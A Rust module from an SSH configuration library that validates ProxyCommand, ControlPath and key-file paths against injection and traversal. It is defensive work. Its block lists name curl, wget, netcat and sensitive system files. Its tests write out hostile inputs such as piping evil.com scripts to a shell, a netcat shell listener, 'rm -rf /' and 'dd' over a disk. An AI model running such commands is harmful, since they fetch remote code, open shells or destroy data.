// Copyright 2025 Lablup Inc. and Jeongkyu Shin
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//! Security validation functions for SSH configuration
//!
//! This module contains security-critical functions that prevent various types of
//! attacks including command injection, path traversal, and privilege escalation.

use anyhow::{Context, Result};
#[cfg(unix)]
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};

use super::path::expand_path_internal;

/// Validate executable strings to prevent command injection attacks
///
/// This function validates strings that might be executed by SSH (like ProxyCommand)
/// to prevent shell injection and other security vulnerabilities.
///
/// # Arguments
/// * `value` - The command string to validate
/// * `option_name` - The name of the SSH option (for error messages)
/// * `line_number` - The line number in the config file (for error messages)
///
/// # Returns
/// * `Ok(())` if the string is safe
/// * `Err(anyhow::Error)` if the value contains dangerous patterns
pub(super) fn validate_executable_string(
    value: &str,
    option_name: &str,
    line_number: usize,
) -> Result<()> {
    // Define dangerous shell metacharacters that could enable command injection
    const DANGEROUS_CHARS: &[char] = &[
        ';',  // Command separator
        '&',  // Background process / command separator
        '|',  // Pipe
        '`',  // Command substitution (backticks)
        '$',  // Variable expansion / command substitution
        '>',  // Output redirection
        '<',  // Input redirection
        '\n', // Newline (command separator)
        '\r', // Carriage return
        '\0', // Null byte
    ];

    // Check for dangerous characters
    if let Some(dangerous_char) = value.chars().find(|c| DANGEROUS_CHARS.contains(c)) {
        anyhow::bail!(
            "Security violation: {option_name} contains dangerous character '{dangerous_char}' at line {line_number}. \
             This could enable command injection attacks."
        );
    }

    // Check for dangerous command substitution patterns
    if value.contains("$(") || value.contains("${") {
        anyhow::bail!(
            "Security violation: {option_name} contains command substitution pattern at line {line_number}. \
             This could enable command injection attacks."
        );
    }

    // Check for double quotes that could break out of string context
    // Count unescaped quotes to detect potential quote injection
    let mut quote_count = 0;
    let chars: Vec<char> = value.chars().collect();
    for (i, &c) in chars.iter().enumerate() {
        if c == '"' {
            // Check if this quote is escaped by counting preceding backslashes
            let mut backslash_count = 0;
            let mut pos = i;
            while pos > 0 {
                pos -= 1;
                if chars[pos] == '\\' {
                    backslash_count += 1;
                } else {
                    break;
                }
            }
            // If even number of backslashes (including 0), quote is not escaped
            if backslash_count % 2 == 0 {
                quote_count += 1;
            }
        }
    }

    // Odd number of unescaped quotes suggests potential quote injection
    if quote_count % 2 != 0 {
        anyhow::bail!(
            "Security violation: {option_name} contains unmatched quote at line {line_number}. \
             This could enable command injection attacks."
        );
    }

    // Additional validation for ControlPath - it should be a path, not a command
    if option_name == "ControlPath" {
        // ControlPath should not contain spaces (legitimate paths with spaces should be quoted)
        // and should not start with suspicious patterns
        if value.trim_start().starts_with('-') {
            anyhow::bail!(
                "Security violation: ControlPath starts with '-' at line {line_number}. \
                 This could be interpreted as a command flag."
            );
        }

        // ControlPath commonly uses %h, %p, %r, %u substitution tokens - these are safe
        // But we should be suspicious of other % patterns that might indicate injection
        let chars: Vec<char> = value.chars().collect();
        let mut i = 0;
        while i < chars.len() {
            if chars[i] == '%' && i + 1 < chars.len() {
                let next_char = chars[i + 1];
                match next_char {
                    'h' | 'p' | 'r' | 'u' | 'L' | 'l' | 'n' | 'd' | '%' => {
                        // These are legitimate SSH substitution tokens
                        i += 2; // Skip both % and the token character
                    }
                    _ => {
                        // Unknown substitution pattern - potentially dangerous
                        anyhow::bail!(
                            "Security violation: ControlPath contains unknown substitution pattern '%{next_char}' at line {line_number}. \
                             Only %h, %p, %r, %u, %L, %l, %n, %d, and %% are allowed."
                        );
                    }
                }
            } else {
                i += 1;
            }
        }
    }

    // Additional validation for ProxyCommand
    if option_name == "ProxyCommand" {
        // ProxyCommand "none" is a special case to disable proxy
        if value == "none" {
            return Ok(());
        }

        // Check for suspicious executable names or patterns
        let trimmed = value.trim();

        // Look for common injection patterns
        if trimmed.starts_with("bash ")
            || trimmed.starts_with("sh ")
            || trimmed.starts_with("/bin/")
            || trimmed.starts_with("python ")
            || trimmed.starts_with("perl ")
            || trimmed.starts_with("ruby ")
        {
            // These could be legitimate but are commonly used in attacks
            tracing::warn!(
                "ProxyCommand at line {} uses potentially risky executable '{}'. \
                 Ensure this is intentional and from a trusted source.",
                line_number,
                trimmed.split_whitespace().next().unwrap_or("")
            );
        }

        // Block obviously malicious patterns
        let lower_value = value.to_lowercase();
        if lower_value.contains("curl ")
            || lower_value.contains("wget ")
            || lower_value.contains("nc ")
            || lower_value.contains("netcat ")
            || lower_value.contains("rm ")
            || lower_value.contains("dd ")
            || lower_value.contains("cat /")
        {
            anyhow::bail!(
                "Security violation: ProxyCommand contains suspicious command pattern at line {line_number}. \
                 Commands like curl, wget, nc, rm, dd are not typical for SSH proxying."
            );
        }
    }

    Ok(())
}

/// Validate ControlPath specifically (allows SSH substitution tokens)
///
/// ControlPath is a special case because it commonly uses SSH substitution tokens
/// like %h, %p, %r, %u which contain literal % and should be allowed, but we still
/// need to block dangerous patterns.
///
/// # Arguments
/// * `path` - The ControlPath value to validate
/// * `line_number` - The line number in the config file (for error messages)
///
/// # Returns
/// * `Ok(())` if the path is safe
/// * `Err(anyhow::Error)` if the path contains dangerous patterns
pub(super) fn validate_control_path(path: &str, line_number: usize) -> Result<()> {
    // ControlPath "none" is a special case to disable control path
    if path == "none" {
        return Ok(());
    }

    // Define dangerous characters for ControlPath (more permissive than general commands)
    const DANGEROUS_CHARS: &[char] = &[
        ';',  // Command separator
        '&',  // Background process / command separator
        '|',  // Pipe
        '`',  // Command substitution (backticks)
        '>',  // Output redirection
        '<',  // Input redirection
        '\n', // Newline (command separator)
        '\r', // Carriage return
        '\0', // Null byte
              // Note: $ is allowed for environment variables but not for command substitution
    ];

    // Check for dangerous characters
    if let Some(dangerous_char) = path.chars().find(|c| DANGEROUS_CHARS.contains(c)) {
        anyhow::bail!(
            "Security violation: ControlPath contains dangerous character '{dangerous_char}' at line {line_number}. \
             This could enable command injection attacks."
        );
    }

    // Check for command substitution patterns (but allow environment variables)
    if path.contains("$(") {
        anyhow::bail!(
            "Security violation: ControlPath contains command substitution pattern at line {line_number}. \
             This could enable command injection attacks."
        );
    }

    // Check for paths starting with suspicious patterns
    if path.trim_start().starts_with('-') {
        anyhow::bail!(
            "Security violation: ControlPath starts with '-' at line {line_number}. \
             This could be interpreted as a command flag."
        );
    }

    // Validate SSH substitution tokens
    let chars: Vec<char> = path.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '%' && i + 1 < chars.len() {
            let next_char = chars[i + 1];
            match next_char {
                'h' | 'p' | 'r' | 'u' | 'L' | 'l' | 'n' | 'd' | '%' => {
                    // These are legitimate SSH substitution tokens
                    i += 2; // Skip both % and the token character
                }
                _ => {
                    // Unknown substitution pattern - potentially dangerous
                    anyhow::bail!(
                        "Security violation: ControlPath contains unknown substitution pattern '%{next_char}' at line {line_number}. \
                         Only %h, %p, %r, %u, %L, %l, %n, %d, and %% are allowed."
                    );
                }
            }
        } else {
            i += 1;
        }
    }

    Ok(())
}

/// Securely validate and expand a file path to prevent path traversal attacks
///
/// # Security Features
/// - Prevents directory traversal with ../ sequences
/// - Validates paths after expansion and canonicalization
/// - Checks file permissions on Unix systems (warns if identity files are world-readable)
/// - Ensures paths don't point to sensitive system files
/// - Handles both absolute and relative paths correctly
/// - Supports safe tilde expansion
///
/// # Arguments
/// * `path` - The file path to validate (may contain ~/ and environment variables)
/// * `path_type` - The type of path for security context ("identity", "known_hosts", or "other")
/// * `line_number` - Line number for error reporting
///
/// # Returns
/// * `Ok(PathBuf)` if the path is safe and valid
/// * `Err(anyhow::Error)` if the path is unsafe or invalid
pub(super) fn secure_validate_path(
    path: &str,
    path_type: &str,
    line_number: usize,
) -> Result<PathBuf> {
    // First expand the path using the existing logic
    let expanded_path = expand_path_internal(path)
        .with_context(|| format!("Failed to expand path '{path}' at line {line_number}"))?;

    // Convert to string for analysis
    let path_str = expanded_path.to_string_lossy();

    // Check for directory traversal sequences
    if path_str.contains("../") || path_str.contains("..\\") {
        anyhow::bail!(
            "Security violation: {path_type} path contains directory traversal sequence '..' at line {line_number}. \
             Path traversal attacks are not allowed."
        );
    }

    // Check for null bytes and other dangerous characters
    if path_str.contains('\0') {
        anyhow::bail!(
            "Security violation: {path_type} path contains null byte at line {line_number}. \
             This could be used for path truncation attacks."
        );
    }

    // Try to canonicalize the path to resolve any remaining relative components
    let canonical_path = if expanded_path.exists() {
        match expanded_path.canonicalize() {
            Ok(canonical) => canonical,
            Err(e) => {
                tracing::debug!(
                    "Could not canonicalize {} path '{}' at line {}: {}. Using expanded path as-is.",
                    path_type, path_str, line_number, e
                );
                expanded_path.clone()
            }
        }
    } else {
        // For non-existent files, just ensure the parent directory is safe
        expanded_path.clone()
    };

    // Re-check for traversal in the canonical path
    let canonical_str = canonical_path.to_string_lossy();
    if canonical_str.contains("..") {
        // This might be legitimate (like a directory literally named "..something")
        // but we need to be very careful about parent directory references
        if canonical_str.split('/').any(|component| component == "..")
            || canonical_str.split('\\').any(|component| component == "..")
        {
            anyhow::bail!(
                "Security violation: Canonicalized {path_type} path '{canonical_str}' contains parent directory references at line {line_number}. \
                 This could indicate a path traversal attempt."
            );
        }
    }

    // Additional security checks based on path type
    match path_type {
        "identity" => {
            validate_identity_file_security(&canonical_path, line_number)?;
        }
        "known_hosts" => {
            validate_known_hosts_file_security(&canonical_path, line_number)?;
        }
        _ => {
            // General path validation for other file types
            validate_general_file_security(&canonical_path, line_number)?;
        }
    }

    Ok(canonical_path)
}

/// Validate security properties of identity files
pub(super) fn validate_identity_file_security(path: &Path, line_number: usize) -> Result<()> {
    // Check for sensitive system paths
    let path_str = path.to_string_lossy();

    // Block access to critical system files
    let sensitive_patterns = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/group",
        "/proc/",
        "/sys/",
        "/dev/",
        "/boot/",
        "/usr/bin/",
        "/bin/",
        "/sbin/",
        "\\Windows\\",
        "\\System32\\",
        "\\Program Files\\",
    ];

    for pattern in &sensitive_patterns {
        if path_str.contains(pattern) {
            anyhow::bail!(
                "Security violation: Identity file path '{path_str}' at line {line_number} points to sensitive system location. \
                 Access to system files is not allowed for security reasons."
            );
        }
    }

    // On Unix systems, check file permissions if the file exists
    #[cfg(unix)]
    if path.exists() && path.is_file() {
        if let Ok(metadata) = std::fs::metadata(path) {
            let permissions = metadata.permissions();
            let mode = permissions.mode();

            // Check if file is world-readable (dangerous for private keys)
            if mode & 0o004 != 0 {
                tracing::warn!(
                    "Security warning: Identity file '{}' at line {} is world-readable. \
                     Private SSH keys should not be readable by other users (chmod 600 recommended).",
                    path_str,
                    line_number
                );
            }

            // Check if file is group-readable (also not ideal for private keys)
            if mode & 0o040 != 0 {
                tracing::warn!(
                    "Security warning: Identity file '{}' at line {} is group-readable. \
                     Private SSH keys should only be readable by the owner (chmod 600 recommended).",
                    path_str,
                    line_number
                );
            }

            // Check if file is world-writable (very dangerous)
            if mode & 0o002 != 0 {
                anyhow::bail!(
                    "Security violation: Identity file '{path_str}' at line {line_number} is world-writable. \
                     This is extremely dangerous and must be fixed immediately."
                );
            }
        }
    }

    Ok(())
}

/// Validate security properties of known_hosts files
pub(super) fn validate_known_hosts_file_security(path: &Path, line_number: usize) -> Result<()> {
    let path_str = path.to_string_lossy();

    // Block access to critical system files
    let sensitive_patterns = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/group",
        "/proc/",
        "/sys/",
        "/dev/",
        "/boot/",
        "/usr/bin/",
        "/bin/",
        "/sbin/",
        "\\Windows\\",
        "\\System32\\",
        "\\Program Files\\",
    ];

    for pattern in &sensitive_patterns {
        if path_str.contains(pattern) {
            anyhow::bail!(
                "Security violation: Known hosts file path '{path_str}' at line {line_number} points to sensitive system location. \
                 Access to system files is not allowed for security reasons."
            );
        }
    }

    // Ensure known_hosts files are in reasonable locations
    let path_lower = path_str.to_lowercase();
    if !path_lower.contains("ssh")
        && !path_lower.contains("known")
        && !path_str.contains("/.")
        && !path_str.starts_with("/etc/ssh/")
        && !path_str.starts_with("/usr/")
        && !path_str.contains("/home/")
        && !path_str.contains("/Users/")
    {
        tracing::warn!(
            "Security warning: Known hosts file '{}' at line {} is in an unusual location. \
             Ensure this is intentional and the file is trustworthy.",
            path_str,
            line_number
        );
    }

    Ok(())
}

/// Validate security properties of general files
pub(super) fn validate_general_file_security(path: &Path, line_number: usize) -> Result<()> {
    let path_str = path.to_string_lossy();

    // Block access to the most critical system files
    let forbidden_patterns = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/group",
        "/etc/sudoers",
        "/proc/",
        "/sys/",
        "/dev/random",
        "/dev/urandom",
        "/boot/",
        "/usr/bin/",
        "/bin/",
        "/sbin/",
        "\\Windows\\System32\\",
        "\\Windows\\SysWOW64\\",
    ];

    for pattern in &forbidden_patterns {
        if path_str.contains(pattern) {
            anyhow::bail!(
                "Security violation: File path '{path_str}' at line {line_number} points to forbidden system location. \
                 Access to this location is not allowed for security reasons."
            );
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_executable_string_legitimate() {
        // Test legitimate ProxyCommand values that should pass
        let legitimate_commands = vec![
            "ssh -W %h:%p gateway.example.com",
            "connect -S proxy.example.com:1080 %h %p",
            "none",
            "socat - PROXY:proxy.example.com:%h:%p,proxyport=8080",
        ];

        for cmd in legitimate_commands {
            let result = validate_executable_string(cmd, "ProxyCommand", 1);
            assert!(result.is_ok(), "Legitimate command should pass: {cmd}");
        }
    }

    #[test]
    fn test_validate_executable_string_malicious() {
        // Test malicious commands that should be blocked
        let malicious_commands = vec![
            "ssh -W %h:%p gateway.example.com; rm -rf /",
            "ssh -W %h:%p gateway.example.com | bash",
            "ssh -W %h:%p gateway.example.com & curl evil.com",
            "ssh -W %h:%p `whoami`",
            "ssh -W %h:%p $(whoami)",
            "curl http://evil.com/malware.sh | bash",
            "wget -O - http://evil.com/script | sh",
            "nc -l 4444 -e /bin/sh",
            "rm -rf /important/files",
            "dd if=/dev/zero of=/dev/sda",
        ];

        for cmd in malicious_commands {
            let result = validate_executable_string(cmd, "ProxyCommand", 1);
            assert!(
                result.is_err(),
                "Malicious command should be blocked: {cmd}"
            );

            let error = result.unwrap_err().to_string();
            assert!(
                error.contains("Security violation"),
                "Error should mention security violation for: {cmd}. Got: {error}"
            );
        }
    }

    #[test]
    fn test_validate_control_path_legitimate() {
        let legitimate_paths = vec![
            "/tmp/ssh-control-%h-%p-%r",
            "~/.ssh/control-%h-%p-%r",
            "/var/run/ssh-%u-%h-%p",
            "none",
        ];

        for path in legitimate_paths {
            let result = validate_control_path(path, 1);
            assert!(result.is_ok(), "Legitimate ControlPath should pass: {path}");
        }
    }

    #[test]
    fn test_validate_control_path_malicious() {
        let malicious_paths = vec![
            "/tmp/ssh-control; rm -rf /",
            "/tmp/ssh-control | bash",
            "/tmp/ssh-control & curl evil.com",
            "/tmp/ssh-control`whoami`",
            "/tmp/ssh-control$(whoami)",
            "-evil-flag",
        ];

        for path in malicious_paths {
            let result = validate_control_path(path, 1);
            assert!(
                result.is_err(),
                "Malicious ControlPath should be blocked: {path}"
            );
        }
    }

    #[test]
    fn test_secure_validate_path_traversal() {
        let traversal_paths = vec![
            "../../../etc/passwd",
            "/home/user/../../../etc/shadow",
            "~/../../../etc/hosts",
        ];

        for path in traversal_paths {
            let result = secure_validate_path(path, "identity", 1);
            assert!(result.is_err(), "Path traversal should be blocked: {path}");

            let error = result.unwrap_err().to_string();
            assert!(
                error.contains("traversal") || error.contains("Security violation"),
                "Error should mention traversal for: {path}. Got: {error}"
            );
        }
    }

    #[test]
    fn test_validate_identity_file_security() {
        use std::path::Path;

        // Test sensitive system files
        let sensitive_paths = vec![
            Path::new("/etc/passwd"),
            Path::new("/etc/shadow"),
            Path::new("/proc/version"),
            Path::new("/dev/null"),
        ];

        for path in sensitive_paths {
            let result = validate_identity_file_security(path, 1);
            assert!(
                result.is_err(),
                "Sensitive path should be blocked: {}",
                path.display()
            );
        }
    }
}
